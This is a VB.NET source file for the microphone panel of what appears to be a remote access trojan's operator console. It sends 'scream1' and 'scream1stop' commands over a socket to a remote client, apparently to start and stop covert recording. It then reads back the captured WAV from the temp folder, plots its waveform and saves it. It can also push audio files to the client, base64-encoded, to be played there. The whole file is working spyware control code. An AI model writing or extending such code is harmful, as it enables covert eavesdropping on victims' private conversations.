Imports System.Runtime.InteropServices
Imports System.IO

Public Class Form12
    Public xxx As Integer '''' 
    Dim s7 As New Label
    Dim MIARRAY As ArrayList
    Dim MAXIMO As Short
    Dim RichTextBox2 As New RichTextBox
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer

    Dim Ci As String = System.Environment.UserName + ".wav"

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        s7.Text += 1
        ListView1.Items.Add("Start |Recording| < " + s7.Text + " >")



        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("Start |Recording| < ") Then
                Process.ImageIndex = 1
                'Process.BackColor = Color.LightSteelBlue

            End If

        Next





    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        Dim RF$ = "IOS\MY.wav"
        My.Computer.Audio.Play(RF, AudioPlayMode.Background)
        If ComboBox1.Text = "Record and run" Then
            'Timer4.Interval = 2000
            PictureBox5.Hide()
            PictureBox6.Show()
            Form1.S.Send(xxx, "scream1")
            Timer1.Enabled = True
            Label1.Text = "Recording ..."
        Else

            'Timer4.Interval = 15500

            Timer2.Enabled = True
            Timer3.Enabled = True

        End If






    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click

        Dim RF$ = "IOS\Kx.wav"
        My.Computer.Audio.Play(RF, AudioPlayMode.Background)
        PictureBox5.Show()
        PictureBox6.Hide()
        Label1.Text = "Running"

        Form1.S.Send(xxx, "scream1stop")
        Timer1.Enabled = False
        ListView1.Items.Add("Stop |Recording|")

        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("Stop |Recording|") Then
                Process.ImageIndex = 0

            End If

        Next


        Timer2.Enabled = False
        Timer3.Enabled = False


    End Sub

    Private Sub Form12_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Computer.Audio.Stop()
    End Sub


    Private Sub Form12_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next

        SetWindowTheme(ListView1.Handle, "explorer", Nothing)
        s7.Text = 1
        TextBox1.Text = Text
        TextBox1.Text = TextBox1.Text.Replace("Microphone | ", "")
        'Dim dd As String
        Dim aa As String = TextBox1.Text
        Dim aa1 As String = TextBox1.Text
        RichTextBox2.Text = aa.LastIndexOf("@")
        Dim xx1 As String = TextBox1.Text
        RichTextBox2.Text = xx1.Substring(RichTextBox2.Text)
        TextBox1.Text = TextBox1.Text.Replace(RichTextBox2.Text, "")
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Dim RF$ = "IOS\MY.wav"
        My.Computer.Audio.Play(RF, AudioPlayMode.Background)


        PictureBox1.Hide()
        PictureBox2.Show()
        mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
        mciSendString("record recsound", "", 0, 0)
        Label3.Text = "Recording..."
        Label3.Visible = True
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click

        PictureBox2.Hide()
        PictureBox1.Show()
        mciSendString("save recsound " + Ci, "", 0, 0)
        mciSendString("close recsound", "", 0, 0)
        Label3.Text = "Stopped..."
        Label3.Visible = False
        My.Computer.Audio.Stop()
        Dim RF$ = "IOS\Kx.wav"
        My.Computer.Audio.Play(RF, AudioPlayMode.Background)
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        Label3.Text = "Playing..."
        Label3.Visible = True
        My.Computer.Audio.Play(Ci, AudioPlayMode.Background)

    End Sub

    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        Label3.Text = "Send..."
        Dim n As New IO.FileInfo(Ci)
        Form1.S.Send(xxx, "sendmusicplay" & Form1.Yy & n.Name & Form1.Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Ci)))
    End Sub


    Sub koko()
        On Error Resume Next
        Dim lood$ = IO.Path.GetTempPath & "Comet" + TextBox1.Text + ".wav"
        Dim MIFILESTREAM As FileStream = New FileStream(lood, FileMode.Open, FileAccess.Read)
        Dim LECTOR As BinaryReader = New BinaryReader(MIFILESTREAM)
        Dim NOMBRE As String = lood
        NOMBRE = NOMBRE.Remove(0, NOMBRE.LastIndexOf("\") + 1)
        Dim CHUNKID As Byte() = LECTOR.ReadBytes(4)
        Dim STRCHUNKID As String = System.Text.Encoding.ASCII.GetString(CHUNKID)
        Dim CHUNKSIZE As Int32 = LECTOR.ReadInt32() + 8
        Dim FORMAT As Byte() = LECTOR.ReadBytes(4)
        Dim STRFORMAT As String = System.Text.Encoding.ASCII.GetString(FORMAT)
        Dim SUBCHUNK1ID As Byte() = LECTOR.ReadBytes(4)
        Dim STRSUBCHUNK1ID As String = System.Text.Encoding.ASCII.GetString(SUBCHUNK1ID)
        Dim SUBCHUNK1SIZE As Int32 = LECTOR.ReadInt32()
        Dim AUDIOFORMAT As Int16 = LECTOR.ReadInt16()
        Dim NUMCHANNELS As Int16 = LECTOR.ReadInt16()
        Dim SAMPLERATE As Int32 = LECTOR.ReadInt32()
        Dim BYTERATE As Int32 = LECTOR.ReadInt32()
        Dim BLOCKALIGN As Int16 = LECTOR.ReadInt16()
        Dim BITPERSAMPLE As Int16 = LECTOR.ReadInt16()
        Dim SUBCHUNK2ID As Byte() = LECTOR.ReadBytes(4)
        Dim STRSUBCHUNK2ID As String = System.Text.Encoding.ASCII.GetString(SUBCHUNK2ID)
        Dim SUBCHUNK2SIZE As Int32 = LECTOR.ReadInt32()
        MIARRAY = New ArrayList
        Dim ORDENAR As New ArrayList
        For I = 0 To (SUBCHUNK2SIZE - 1) / 2
            MIARRAY.Add(LECTOR.ReadInt16)
            ORDENAR.Add(MIARRAY(I))
        Next
        ORDENAR.Sort()
        MAXIMO = ORDENAR(ORDENAR.Count - 1)
        PINTA()
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next



        'Timer4.Enabled = True
        Form1.S.Send(xxx, "scream1stop")
      
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        PictureBox5.Hide()
        PictureBox6.Show()
        Form1.S.Send(xxx, "scream1")

        Timer1.Enabled = True
        Label1.Text = "Recording ..."
        Timer3.Enabled = False
        Timer3.Enabled = True
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Public Sub PINTA()
        On Error Resume Next
        Dim BM As New Bitmap(PictureBox0.Width, PictureBox0.Height)
        Dim DIBUJO As Graphics = Graphics.FromImage(BM)
        Dim DISTRIBUCION As Integer = (MIARRAY.Count) / (BM.Width)
        Dim CENTRO As Integer = BM.Height / 2
        Dim PASO As Integer = 1
        Select Case PASO
            Case 1
                PASO = 2
            Case 2
                PASO = 4
            Case 3
                PASO = 8
            Case 4
                PASO = 16
        End Select
        Dim ESCALA As Integer = 1
        Select Case ESCALA
            Case 1
                ESCALA = 4
            Case 2
                ESCALA = 3
            Case 3
                ESCALA = 2
            Case 4
                ESCALA = 1
        End Select
        For I = 0 To BM.Width - 2 Step PASO
            Dim CANALIZDO As Integer = Math.Abs(MIARRAY(I * DISTRIBUCION))
            Dim ESCALAIZDO As Single = CANALIZDO / (MAXIMO * ESCALA)
            Dim ALTURAIZDO As Integer = ESCALAIZDO * BM.Height
            DIBUJO.DrawLine(Pens.Red, I, CENTRO, I, CENTRO - ALTURAIZDO)
            Dim CANALDCHO As Integer = Math.Abs(MIARRAY((I + 1) * DISTRIBUCION))
            Dim ESCALADCHO As Single = CANALDCHO / (MAXIMO * ESCALA)
            Dim ALTURADCHO As Integer = ESCALADCHO * BM.Height
            DIBUJO.DrawLine(Pens.Red, I, CENTRO, I, CENTRO + ALTURADCHO)
        Next
        PictureBox0.Image = BM

    


    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick

        koko()

    End Sub

    Private Sub PictureBox0_Click(sender As Object, e As EventArgs) Handles PictureBox0.Click

        Dim domx$ = "Comet" + TextBox1.Text + ".wav"



        Dim s As New SaveFileDialog
        s.Filter = "|*.wav"
        If s.ShowDialog = Windows.Forms.DialogResult.OK Then

            File.Copy(IO.Path.GetTempPath & domx, s.FileName)
        End If
    End Sub

    Private Sub ClsButtonBlue1_Click(sender As Object, e As EventArgs) Handles ClsButtonBlue1.Click
        Dim o As New OpenFileDialog
        If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim n As New IO.FileInfo(o.FileName)
            Form1.S.Send(xxx, "sendmusicplay" & Form1.Yy & n.Name & Form1.Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))

        End If
    End Sub
End Class